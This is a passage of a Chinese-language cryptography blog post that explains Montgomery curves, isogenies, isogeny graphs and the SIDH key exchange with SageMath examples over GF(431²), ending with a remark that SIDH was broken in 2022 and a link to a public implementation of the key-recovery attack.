inline">\(y^2=x^3+ax+b\)</span>方程所确定的曲线，这类方程一般称为魏尔斯特拉斯（Weierstrass）方程，这类方程确定的曲线一般称为魏尔斯特拉斯形式的椭圆曲线，还有另外一种形式的椭圆曲线是由方程<span class="math inline">\(y^2=x^3+Ax^2+x\)</span>所定义的，这类椭圆曲线被称为蒙哥马利曲线，对于一条蒙哥马利曲线<span class="math inline">\(E:y^2=x^3+Ax^2+x\)</span>，其<span class="math inline">\(j\)</span>-不变量为： <span class="math display">\[j(E)=\frac{256(A^2-3)^3}{A^2-4}\]</span> 任意一条椭圆曲线都可以转换为<span class="math inline">\(j\)</span>-不变量相同（亦即同构）的蒙哥马利曲线，在sage中，我们可以通过<code>montgomery_model</code>来将一条椭圆曲线转换为蒙哥马利曲线，例如我们要将魏尔斯特拉斯形式的椭圆曲线： <span class="math display">\[E:y^2=x^3+312589632x+654443578\pmod{1912812599}\]</span> 转换为对应的蒙哥马利曲线，则可以通过如下代码进行： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">1912812599</span></span><br><span class="line">a = <span class="number">312589632</span></span><br><span class="line">b = <span class="number">654443578</span></span><br><span class="line"></span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">E_M = <span class="built_in">print</span>(E.montgomery_model()</span><br></pre></td></tr></table></figure> 可以得到其对应的蒙哥马利曲线为： <span class="math display">\[E_M:y^2 = x^3 + 723347356x^2 + x\pmod{1912812599}\]</span></p><h3 id="同源">同源</h3><p>同源实际上就是一条曲线到另一条曲线或者一条曲线到自身的映射，其本质为同态，可以简单地表达为<span class="math inline">\((x,y)\mapsto(f(x,y),g(x,y))\)</span>，其中<span class="math inline">\(f,g\)</span>是两个函数。在之后的讨论中将主要以蒙哥马利曲线为主，因为蒙哥马利曲线之间的映射可以单纯通过对<span class="math inline">\(x\)</span>进行映射<span class="math inline">\(x\mapsto f(x)\)</span>来表示出曲线间完整的映射，其完整映射形式为： <span class="math display">\[(x,y)\mapsto(f(x),cyf&#39;(x))\]</span> 其中<span class="math inline">\(c\)</span>是固定常数，<span class="math inline">\(f&#39;\)</span>为<span class="math inline">\(f\)</span>的导函数. 对于一条蒙哥马利曲线<span class="math inline">\(E:y^2=x^3+ax^2+x\)</span>，可以得到一个<span class="math inline">\(E\)</span>到<span class="math inline">\(E\)</span>的同构映射： <span class="math display">\[[2]:E\mapsto E, x\mapsto\frac{(x^2-1)^2}{4x(x^2+ax+1)}\]</span> 这个映射一般称为二倍点映射，事实上，我们令分母<span class="math inline">\(4x(x^2+ax+1)=0\)</span>，可以得到三个根<span class="math inline">\(0,\alpha,\frac{1}{\alpha}\)</span>（其中<span class="math inline">\(\alpha\)</span>满足<span class="math inline">\(\alpha^2+a\alpha+1\)</span>），我们就可以得到曲线上阶为<span class="math inline">\(2\)</span>的点：<span class="math inline">\((0,0),(\alpha,0),(\frac{1}{\alpha},0)\)</span>，这三个点的集合就是映射<span class="math inline">\([2]\)</span>的核，记为<span class="math inline">\(\ker([2])\)</span>，它是椭圆曲线群<span class="math inline">\(E\)</span>的一个子群，同构于<span class="math inline">\(\mathbb{Z}_2\times\mathbb{Z}_2\)</span>，这上面的点称为<span class="math inline">\(2\)</span>-torsion，事实上对于任意一条椭圆曲线都有其对应的<span class="math inline">\(\ker([2])\)</span> 例如对于<span class="math inline">\(GF(431^2)\)</span>下的椭圆曲线<span class="math inline">\(E:y^2=x^3+x\)</span>，可以通过如下代码得到对应的上述映射： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">R.&lt;i&gt; = GF(p^<span class="number">2</span>, modulus=[<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>])</span><br><span class="line">a = <span class="number">1</span></span><br><span class="line">E = EllipticCurve(R, [<span class="number">1</span>, <span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(E._multiple_x_numerator(<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(E._multiple_x_denominator(<span class="number">2</span>))</span><br></pre></td></tr></table></figure> 可以得到： <span class="math display">\[[2]:E\mapsto E,x\mapsto\frac{x^4 + 429x^2 + 1}{4x^3 + 4x}\]</span> 我们令分母<span class="math inline">\(4x^3+4x=4(x^3+x)=0\)</span>，得到三个解<span class="math inline">\(0,i,-i\)</span>，据此我们就可以得到一个<span class="math inline">\(E\)</span>的一个子群<span class="math inline">\(\ker([2])=\{(0,0),(i,0),(-i,0),\mathcal{O}\}\)</span>，而且这三个点都可以确定一个二阶循环子群，我们可以通过sage的<code>division_points</code>方法对<span class="math inline">\(E\)</span>的零元开二次根来达到这一目的：<code>E(0).division_points(2)</code>，参考资料2中给出了这样一个图来描述<span class="math inline">\(\ker([2])\)</span>： <img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202502261959041.png" alt="image-20250226195932625" /> 在这里每个“花瓣”对应一个二阶循环子群。相应的，还有三倍点映射<span class="math inline">\([3]\)</span>，对于蒙哥马利曲线<span class="math inline">\(E:y^2=x^3+ax^2+x\)</span>，其对应三倍点映射为： <span class="math display">\[[3]:E\mapsto E:x\mapsto\frac{x(x^4-6x^2-4ax^3-3)^2}{(3x^4+4ax^3+6x^2-1)^2}\]</span> 通过令分母等于<span class="math inline">\(0\)</span>我们可以得到四个根<span class="math inline">\(\beta,\delta,\zeta,\theta\)</span>，通过这四个根我们可以得到八个阶为<span class="math inline">\(3\)</span>的点：<span class="math inline">\((\beta,\pm\gamma),(\delta,\pm\epsilon),(\zeta,\pm\eta),(\theta,\pm\iota)\)</span>，这八个点加上无穷远点可以构成子群<span class="math inline">\(\ker([3])\simeq\mathbb{Z}_3\times\mathbb{Z}_3\)</span>，也可以叫做<span class="math inline">\(3\)</span>-torsion，<span class="math inline">\(3\)</span>-torsion的结构如下图所示： <img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202502262000994.png" alt="image-20250226200054634" /></p><p>这里每个“花瓣”对应一个三阶循环子群。推广到一般情况，所有阶为<span class="math inline">\(l\)</span>的点（<span class="math inline">\(p\nmid l\)</span>）与<span class="math inline">\(\mathcal{O}\)</span>构成的子群就是<span class="math inline">\(\ker([l])\simeq \mathbb{Z}_l\times\mathbb{Z}_l\)</span>（或者称为<span class="math inline">\(l\)</span>-torsion)，而若<span class="math inline">\(l\)</span>为质数，则可以得到<span class="math inline">\(l+1\)</span>个<span class="math inline">\(l\)</span>阶循环子群</p><h4 id="可分同源">可分同源</h4><p>可分同源的定义为对于一条曲线<span class="math inline">\(E\)</span>上的椭圆曲线群以及它的一个子群<span class="math inline">\(G\)</span>，可以构造出唯一的同源<span class="math inline">\(\phi:E\mapsto E&#39;\)</span>，使得<span class="math inline">\(\ker(\phi)=G\)</span>，这样得到的曲线<span class="math inline">\(E&#39;\)</span>称为该同源的陪域（codomain），可以表示为<span class="math inline">\(E/G\)</span>。可分同源的另一种定义（Velu's formulas）是：输入一条椭圆曲线<span class="math inline">\(E\)</span>以及其子群<span class="math inline">\(G\)</span>的所有点，输出陪域<span class="math inline">\(E/G\)</span>以及对应的映射<span class="math inline">\(\phi\)</span>。</p><blockquote><p>由于<span class="math inline">\(\ker(\phi)=G\)</span>，所以对于任意点<span class="math inline">\(P\in G\)</span>，都有<span class="math inline">\(\phi(P)=\mathcal{O}\)</span></p></blockquote><p>以蒙哥马利曲线<span class="math inline">\(E:y^2=x^3+ax^2+x\)</span>为例，设其上一个二阶子群为<span class="math inline">\(G=\{\mathcal{O},(\alpha,0)\}\)</span>，我们可以以<span class="math inline">\(G,E\)</span>作为输入，得到映射<span class="math inline">\(\phi\)</span>： <span class="math display">\[\phi:x\mapsto\frac{x(\alpha x-1)}{x-\alpha}\]</span> 以及陪域<span class="math inline">\(E&#39;:y^2=x^3+2(1-2\alpha^2)x^2+x\)</span>，这个映射被用于计算蒙哥马利曲线的2-同源（2-isogeny），对<span class="math inline">\(GF(431^2)\)</span>下的超奇异曲线<span class="math inline">\(E:y^2=x^3+(208i+161)x^2+x\)</span>，我们知道<span class="math inline">\(j(E)=364i+304\)</span>，则可以通过如下代码求得其一个<span class="math inline">\(2\)</span>-同源并确保其输出的陪域为蒙哥马利曲线： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">431</span></span><br><span class="line">R.&lt;i&gt; = GF(p^<span class="number">2</span>, modulus=[<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>])</span><br><span class="line">E = EllipticCurve(R, [<span class="number">0</span>, <span class="number">208</span>*i+<span class="number">161</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">ker2 = E(<span class="number">0</span>).division_points(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># [(0 : 1 : 0), (0 : 0 : 1), (350*i + 68 : 0 : 1), (304*i + 202 : 0 : 1)]</span></span><br><span class="line"></span><br><span class="line">alpha = ker2[<span class="number">2</span>]</span><br><span class="line">phi = E.isogeny(alpha, model = <span class="string">&quot;montgomery&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(phi.rational_maps())</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line">E_ = phi.codomain()</span><br><span class="line"><span class="built_in">print</span>(E_)</span><br><span class="line"><span class="built_in">print</span>(E_.j_invariant())</span><br></pre></td></tr></table></figure> 可以得到映射<span class="math inline">\(\phi\)</span>： <span class="math display">\[\phi:x\mapsto\frac{(-81i + 68)x^2 - x}{x + (81i - 68)}\]</span> 以及陪域<span class="math inline">\(E&#39;:y^2 = x^3 + (102i+423)x^2 + x\)</span>，其<span class="math inline">\(j\)</span>-不变量<span class="math inline">\(j(E&#39;)=344i+190\)</span>，所以我们可以知道：同源会使其<span class="math inline">\(j\)</span>不变量发生变化。</p><h4 id="d-同源"><span class="math inline">\(d\)</span>-同源</h4><p>对于同源<span class="math inline">\(\phi\)</span>，我们称<span class="math inline">\(|\ker(\phi)|\)</span>为同源的度，度为<span class="math inline">\(d\)</span>的同源称为<span class="math inline">\(d\)</span>-同源，例如前面提到的<span class="math inline">\(2\)</span>-同源.</p><h4 id="sage上的同源">sage上的同源</h4><p>我们一般用sage的<code>isogeny</code>方法来计算同源，其函数原型如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">isogeny(_kernel_, _codomain=None_, _degree=None_, _model=None_, _check=True_, _algorithm=None_, _velu_sqrt_bound=None_)</span><br></pre></td></tr></table></figure> 重要的参数如下：</p><ul><li><p><code>_kernel_</code>：就是前面提到输入的<span class="math inline">\(G\)</span>，可以是一个点，可以是点列，也可以是本原核多项式</p></li><li><p><code>codomain</code>：陪域，输入为一条椭圆曲线，这样生成的同源的陪域就是这条椭圆曲线</p></li><li><p><code>model</code>：输出的陪域的形式，有三种可选参数：</p></li></ul><ol type="1"><li><code>'minimal'</code>，输出全局最小的椭圆曲线</li><li><code>'short_weierstrass'</code>，输出short Weierstrass曲线，即由<span class="math inline">\(y^2=x^3+ax+b\)</span>形式的方程所定义的椭圆曲线</li><li><code>'montgomery'</code>输出蒙哥马利曲线</li></ol><ul><li><code>algorithm</code>：算法，有三种可选参数（均为自己的理解，可能不准确）：</li></ul><ol type="1"><li><code>'velusqrt'</code>，使用平方根Vélu算法</li><li><code>'factored'</code>，将度分解到为质因子之后再求解</li><li><code>'traditional'</code>，传统算法</li></ol><h3 id="同源图isogeny-graph">同源图（Isogeny graph）</h3><p>对于一个固定的<span class="math inline">\(p\)</span>，我们用<span class="math inline">\(GF(p^2)\)</span>中所有的超奇异<span class="math inline">\(j\)</span>-不变量各构造一条曲线，在每条曲线的<span class="math inline">\(\ker([l])\)</span>中取除了无穷远点外的所有点分别进行同源，将原来曲线的<span class="math inline">\(j\)</span>-不变量作为起点，同源得到的陪域的<span class="math inline">\(j\)</span>-不变量作为终点，就可以得到一个无向图，称为同源图，例如在参考资料2中给出的<span class="math inline">\(GF(431^2)\)</span>下的<span class="math inline">\(\ker([2])\)</span>的同源图： <img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202502262006853.png" alt="image-20250226200558759" /> 通过同源图，我们可以知道超奇异曲线的<span class="math inline">\(j\)</span>-不变量在同源时的变化路线. 可以通过如下算法求<span class="math inline">\(GF(p^2)\)</span>下的<span class="math inline">\(\ker([l])\)</span>的同源图：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">IsogenyGraph</span>(<span class="params">p, l=<span class="number">2</span>, vertex_size=<span class="number">3750</span>, size=[<span class="number">20</span>, <span class="number">20</span>]</span>):</span><br><span class="line">    R.&lt;i&gt; = GF(p^<span class="number">2</span>, modulus=[<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    jlist = &#123;&#125;</span><br><span class="line">    Elist = []</span><br><span class="line"></span><br><span class="line">    E = EllipticCurve(R, [<span class="number">1</span>, <span class="number">0</span>])</span><br><span class="line">    <span class="keyword">assert</span> E.is_supersingular()</span><br><span class="line">    jlist[E.j_invariant()] = <span class="built_in">set</span>()</span><br><span class="line">    Elist.append(E)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> Elist:</span><br><span class="line">        tmp = Elist.pop()</span><br><span class="line">        kerl = tmp(<span class="number">0</span>).division_points(l)</span><br><span class="line">        <span class="keyword">for</span> P <span class="keyword">in</span> kerl:</span><br><span class="line">            <span class="keyword">if</span> P != tmp(<span class="number">0</span>):</span><br><span class="line">                phi = tmp.isogeny(P, model = <span class="string">&quot;montgomery&quot;</span>)</span><br><span class="line">                E2 = phi.codomain()</span><br><span class="line">                j = E2.j_invariant()</span><br><span class="line">                <span class="comment"># print(tmp.j_invariant(), j)</span></span><br><span class="line">                <span class="keyword">if</span> j <span class="keyword">not</span> <span class="keyword">in</span> jlist:</span><br><span class="line">                    jlist[j] = <span class="built_in">set</span>()</span><br><span class="line">                <span class="keyword">if</span> j <span class="keyword">not</span> <span class="keyword">in</span> jlist[tmp.j_invariant()]:</span><br><span class="line">                    jlist[tmp.j_invariant()].add(j)</span><br><span class="line">                    Elist.append(E2)</span><br><span class="line"></span><br><span class="line">    Tab = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> jlist:</span><br><span class="line">        Tab[x] = <span class="built_in">list</span>(jlist[x])</span><br><span class="line">    G = Graph(Tab)</span><br><span class="line"></span><br><span class="line">    G.set_pos(G.layout_circular())</span><br><span class="line">    G.plot(vertex_labels=<span class="literal">True</span>,vertex_size=vertex_size).show(figsize=size)</span><br></pre></td></tr></table></figure><p>通过这个算法画出来的<span class="math inline">\(GF(431^2)\)</span>下的<span class="math inline">\(\ker([2])\)</span>的同源图长这样： <img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202502261957075.png" alt="output" /></p><h2 id="超奇异同源diffie-hellman密钥交换体系sidh">超奇异同源Diffie-Hellman密钥交换体系（SIDH）</h2><h3 id="sidh协议细节">SIDH协议细节</h3><p>首先密钥交换双方（以下称为Alice和Bob）协商选取模数<span class="math inline">\(p=2^a3^b-1\)</span>，其中<span class="math inline">\(2^a\approx 3^b\)</span>，然后选取一条<span class="math inline">\(GF(p^2)\)</span>下的超奇异椭圆曲线<span class="math inline">\(E\)</span>，在此之后，Alice选取<span class="math inline">\(E\)</span>上阶为<span class="math inline">\(2^a\)</span>的两点<span class="math inline">\(P_A,Q_A\)</span>并公开，Bob选取<span class="math inline">\(E\)</span>上阶为<span class="math inline">\(3^b\)</span>的两点<span class="math inline">\(P_B,Q_B\)</span>并公开（在选取的时候，需要保证<span class="math inline">\(P_A,Q_A\)</span>线性无关，<span class="math inline">\(P_B,Q_B\)</span>线性无关）。 Alice随机选取秘密值<span class="math inline">\(k_A\in\{0,1,\cdots,2^a-1\}\)</span>，计算<span class="math inline">\(S_A=P_A+k_AQ_A\)</span>，并通过<span class="math inline">\(S_A\)</span>计算同源<span class="math inline">\(\phi_A:E\mapsto E_A\)</span>，其中<span class="math inline">\(E_A=E/\langle S_A\rangle\)</span>，<span class="math inline">\(\phi_A\)</span>由<span class="math inline">\(a\)</span>个<span class="math inline">\(2\)</span>-同源组合而成，最后使用<span class="math inline">\((E_A,\phi_A(P_B),\phi_A(Q_B))\)</span>作为公钥，<span class="math inline">\((k_A,S_A)\)</span>作为私钥； 同样的，Bob随机选取秘密值<span class="math inline">\(k_B\in\{0,1,\cdots,3^b-1\}\)</span>，计算<span class="math inline">\(S_B=P_B+k_BQ_B\)</span>，通过<span class="math inline">\(S_B\)</span>计算同源<span class="math inline">\(\phi_B:E\mapsto E_B\)</span>，其中<span class="math inline">\(\phi_B\)</span>由<span class="math inline">\(b\)</span>个<span class="math inline">\(3\)</span>-同源组合而成，使用<span class="math inline">\((E_B,\phi_B(P_A),\phi_B(Q_A))\)</span>作为公钥，<span class="math inline">\((k_B,S_B)\)</span>作为私钥。 通过上述计算得到的公钥，Alice可以计算出<span class="math inline">\(S_{A}&#39;=\phi_B(P_A)+k_A\phi_B(Q_A)\)</span>，计算同源<span class="math inline">\(\phi_A&#39;:E_B\mapsto E_{AB}\)</span>，就可以计算出<span class="math inline">\(j_{AB}=j(E_{AB})\)</span>，同样的，Bob可以计算出<span class="math inline">\(S_{B}&#39;=\phi_A(P_B)+k_B\phi_A(Q_B)\)</span>，然后计算同源<span class="math inline">\(\phi_B&#39;:E_A\mapsto E_{BA}\)</span>，从而可以计算出<span class="math inline">\(j_{BA}=j(E_{BA})\)</span>，有<span class="math inline">\(j_{AB}=j_{BA}\)</span>，所以共享密钥值为<span class="math inline">\(j=j_{AB}=j_{BA}\)</span>.</p><h4 id="sidh实例">SIDH实例</h4><blockquote><p>本样例来源于参考资料2</p></blockquote><p>Alice和Bob协商选取模数<span class="math inline">\(p=2^43^3-1=431\)</span>，并选取<span class="math inline">\(GF(p^2)\)</span>上的一条超奇异椭圆曲线： <span class="math display">\[E:y^2=x^3+(329i+423)x^2+x\]</span> 有<span class="math inline">\(j(E)=87i+190\)</span>，Alice从中选取两个阶为<span class="math inline">\(2^4\)</span>的点： <span class="math display">\[P_A=(100i+248,304i+199),Q_A=(426i+394,51i+79)\]</span> 同时Bob从中选取两个阶为<span class="math inline">\(3^3\)</span>的点： <span class="math display">\[P_B = (358i+275, 410i+104),Q_B = (20i+185, 281i+239)\]</span> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">2</span>^<span class="number">4</span> * <span class="number">3</span>^<span class="number">3</span> - <span class="number">1</span></span><br><span class="line">R.&lt;i&gt; = GF(p^<span class="number">2</span>, modulus=[<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>])</span><br><span class="line">a = <span class="number">329</span>*i + <span class="number">423</span></span><br><span class="line"></span><br><span class="line">E = EllipticCurve(R, [<span class="number">0</span>, a, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">PA = E(<span class="number">100</span>*i+<span class="number">248</span>, <span class="number">304</span>*i+<span class="number">199</span>)</span><br><span class="line">QA = E(<span class="number">426</span>*i+<span class="number">394</span>, <span class="number">51</span>*i+<span class="number">79</span>)</span><br><span class="line"><span class="keyword">assert</span> PA.order() == QA.order() == <span class="number">2</span>^<span class="number">4</span></span><br><span class="line"></span><br><span class="line">PB = E(<span class="number">358</span>*i+<span class="number">275</span>, <span class="number">410</span>*i+<span class="number">104</span>)</span><br><span class="line">QB = E(<span class="number">20</span>*i+<span class="number">185</span>, <span class="number">281</span>*i+<span class="number">239</span>)</span><br><span class="line"><span class="keyword">assert</span> PB.order() == QB.order() == <span class="number">3</span>^<span class="number">3</span></span><br></pre></td></tr></table></figure> 然后Alice从<span class="math inline">\(\{0,1,\cdots,2^4-1\}\)</span>中选择<span class="math inline">\(k_A=11\)</span>，据此计算<span class="math inline">\(S_A=P_A+k_AQ_A=(271i + 79, 153i + 430)\)</span>，我们可以通过如下算法计算同源路径从而得到<span class="math inline">\(S_A\)</span>对应的同源： <img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202502262005508.png" alt="image-20250226200532409" /> 其中<span class="math inline">\(e\)</span>表示恒等映射，sage代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">phis = []</span><br><span class="line"></span><br><span class="line">SA_, EA_, PB_, QB_ = SA, E, PB, QB</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(a-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    RA_ = SA_ * <span class="number">2</span>^e</span><br><span class="line">    phi = EA_.isogeny(-RA_, model=<span class="string">&quot;montgomery&quot;</span>)</span><br><span class="line">    phis.append(phi)</span><br><span class="line">    SA_, EA_, PB_, QB_ = phi(SA_), phi.codomain(), phi(PB_), phi(QB_)</span><br><span class="line"></span><br><span class="line">phiA = phis[-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(phis) - <span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    phiA = phiA * phis[i]</span><br></pre></td></tr></table></figure><p>计算得到<span class="math inline">\(E_A:y^2 = x^3 + (128i+19)x^2 + x\)</span>，<span class="math inline">\(\phi_A(P_B)=(130i + 170,428i + 290)\)</span>，<span class="math inline">\(\phi_A(Q_B)=(235i+209,126i+15)\)</span>； 同理，Bob在<span class="math inline">\(\{0,1,\cdots,3^3-1\}\)</span>中选择<span class="math inline">\(k_B=2\)</span>，计算<span class="math inline">\(S_B=P_B+k_BQ_B=(122i +309, 291i+374)\)</span>，那么我们可以通过如下算法计算出<span class="math inline">\(S_B\)</span>对应的同源： <img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202502262003851.png" alt="image-20250226200334440" /> 其中<span class="math inline">\(e\)</span>表示恒等映射，sage代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">phis = []</span><br><span class="line">SB_, EB_, PA_, QA_ = SB, E, PA, QA</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(b-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    RB_ = SB_ * <span class="number">3</span>^e</span><br><span class="line">    phi = EB_.isogeny(RB_, model=<span class="string">&quot;montgomery&quot;</span>)</span><br><span class="line">    phis.append(phi)</span><br><span class="line">    SB_, EB_, PA_, QA_ = phi(SB_), phi.codomain(), phi(PA_), phi(QA_)</span><br><span class="line"></span><br><span class="line">phiB = phis[-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(phis) - <span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    phiB = phiB * phis[i]</span><br></pre></td></tr></table></figure><p>计算得到<span class="math inline">\(E_B:y^2 = x^3 + (329i+8)x^2 + x\)</span>，<span class="math inline">\(\phi_B(P_A)=(160i + 421, 246i + 252)\)</span>，<span class="math inline">\(\phi_B(Q_A)=(119i+14, 246i + 138)\)</span> 这样双方的公钥均已经计算出来，最后Alice就可以通过自己的私钥计算出： <span class="math display">\[S_{A}&#39;=\phi_B(P_A)+k_A\phi{(Q_A)}\]</span> 再通过上述算法计算出Alice侧<span class="math inline">\(S_{A}&#39;\)</span>对应的同源的陪域<span class="math inline">\(E_A/\langle S_{A}&#39;\rangle\)</span>，那么这个陪域的<span class="math inline">\(j\)</span>-不变量就是共享密钥，同样的，Bob可以通过自己的私钥计算出： <span class="math display">\[S_{B}&#39;=\phi_A(P_B)+k_B\phi{(Q_A)}\]</span> 再通过上述算法计算出Bob侧<span class="math inline">\(S_{B}&#39;\)</span>对应的同源的陪域<span class="math inline">\(E_B/\langle S_{B}&#39;\rangle\)</span>，那么这个陪域的<span class="math inline">\(j\)</span>-不变量就是共享密钥，可以通过下列代码计算出共享密钥： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">SAB = phiA(PB) + kB * phiA(QB)</span><br><span class="line">EAB = EA_.isogeny(SAB, model=<span class="string">&quot;montgomery&quot;</span>).codomain()</span><br><span class="line">Bob_shared_secret = EAB.j_invariant()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Bob_shared_secret)</span><br><span class="line">SBA = phiB(PA) + kA * phiB(QA)</span><br><span class="line">EBA = EB_.isogeny(SBA, model=<span class="string">&quot;montgomery&quot;</span>).codomain()</span><br><span class="line">Alice_shared_secret = EBA.j_invariant()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Alice_shared_secret)</span><br></pre></td></tr></table></figure> 可以计算出共享密钥为<span class="math inline">\(234\)</span>，整理并优化代码后可以得到： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">4</span></span><br><span class="line">b = <span class="number">3</span></span><br><span class="line">p = <span class="number">2</span>^a * <span class="number">3</span>^b - <span class="number">1</span></span><br><span class="line">R.&lt;i&gt; = GF(p^<span class="number">2</span>, modulus=[<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>])</span><br><span class="line">A = <span class="number">329</span>*i + <span class="number">423</span></span><br><span class="line"></span><br><span class="line">E = EllipticCurve(R, [<span class="number">0</span>, A, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">PA = E(<span class="number">100</span>*i+<span class="number">248</span>, <span class="number">304</span>*i+<span class="number">199</span>)</span><br><span class="line">QA = E(<span class="number">426</span>*i+<span class="number">394</span>, <span class="number">51</span>*i+<span class="number">79</span>)</span><br><span class="line"></span><br><span class="line">PB = E(<span class="number">358</span>*i+<span class="number">275</span>, <span class="number">410</span>*i+<span class="number">104</span>)</span><br><span class="line">QB = E(<span class="number">20</span>*i+<span class="number">185</span>, <span class="number">281</span>*i+<span class="number">239</span>)</span><br><span class="line"><span class="keyword">assert</span> PA.order() == QA.order() == <span class="number">2</span>^<span class="number">4</span> <span class="keyword">and</span> PB.order() == QB.order() == <span class="number">3</span>^<span class="number">3</span></span><br><span class="line"></span><br><span class="line">kA = <span class="number">11</span></span><br><span class="line">SA = PA + kA * QA</span><br><span class="line">phiA = E.isogeny(SA, model=<span class="string">&quot;montgomery&quot;</span>, algorithm=<span class="string">&quot;factored&quot;</span>)</span><br><span class="line">EA = phiA.codomain()</span><br><span class="line">PB_ = phiA(PB)</span><br><span class="line">QB_ = phiA(QB)</span><br><span class="line"></span><br><span class="line">kB = <span class="number">2</span></span><br><span class="line">SB = PB + kB * QB</span><br><span class="line">phiB = E.isogeny(SB, model=<span class="string">&quot;montgomery&quot;</span>, algorithm=<span class="string">&quot;factored&quot;</span>)</span><br><span class="line">EB = phiB.codomain()</span><br><span class="line">PA_ = phiB(PA)</span><br><span class="line">QA_ = phiB(QA)</span><br><span class="line"></span><br><span class="line">SAB = phiA(PB) + kB * phiA(QB)</span><br><span class="line">EAB = EA.isogeny(SAB, model=<span class="string">&quot;montgomery&quot;</span>, algorithm=<span class="string">&quot;factored&quot;</span>).codomain()</span><br><span class="line">Bob_shared_secret = EAB.j_invariant()</span><br><span class="line"></span><br><span class="line">SBA = phiB(PA) + kA * phiB(QA)</span><br><span class="line">EBA = EB.isogeny(SBA, model=<span class="string">&quot;montgomery&quot;</span>, algorithm=<span class="string">&quot;factored&quot;</span>).codomain()</span><br><span class="line">Alice_shared_secret = EBA.j_invariant()</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> Bob_shared_secret == Alice_shared_secret</span><br><span class="line"><span class="built_in">print</span>(Alice_shared_secret)</span><br></pre></td></tr></table></figure> 或者可以将封装公钥和计算私钥封装为函数： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gen_public_key</span>(<span class="params">E, P1, Q1, s, P2, Q2</span>):</span><br><span class="line">    S = P1 + s*Q1</span><br><span class="line">    phi = E.isogeny(S, model=<span class="string">&#x27;montgomery&#x27;</span>, algorithm=<span class="string">&quot;factored&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> phi, (phi.codomain(), phi(P2), phi(Q2))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_shared_secret</span>(<span class="params">E, P, Q, s</span>):</span><br><span class="line">    S = P + s*Q</span><br><span class="line">    phi1 = E.isogeny(S, model=<span class="string">&#x27;montgomery&#x27;</span>, algorithm=<span class="string">&quot;factored&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> phi1.codomain().j_invariant()</span><br></pre></td></tr></table></figure></p><h3 id="sidh的安全性">SIDH的安全性</h3><p>理论上SIDH的安全性主要依赖于通过公钥中给出的曲线来求出它对应的同源。但是在2022年SIDH就被宣布完全破解，在Github上就有代码：<a href="https://github.com/GiacomoPope/Castryck-Decru-SageMath">GiacomoPope/Castryck-Decru-SageMath: A SageMath implementation of the Castryck-Decru Key Recovery attack on SIDH</a>，<del>要用的话拔出来用就行</del></p>]]></content>
      
      
      <categories>
          
          <category> 密码学笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过狄利克雷近似解决HNP-2H</title>
      <link href="/2024/11/30/%E9%80%9A%E8%BF%87%E7%8B%84%E5%88%A9%E5%85%8B%E9%9B%B7%E8%BF%91%E4%BC%BC%E8%A7%A3%E5%86%B3HNP-2H/"/>
      <url>/2024/11/30/%E9%80%9A%E8%BF%87%E7%8B%84%E5%88%A9%E5%85%8B%E9%9B%B7%E8%BF%91%E4%BC%BC%E8%A7%A3%E5%86%B3HNP-2H/</url>
      
